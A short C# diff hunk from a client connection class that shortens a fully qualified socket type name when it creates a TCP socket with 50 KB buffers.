@@ -36,7 +36,7 @@ namespace Client.Connection
             try
             {
 
-                TcpClient = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
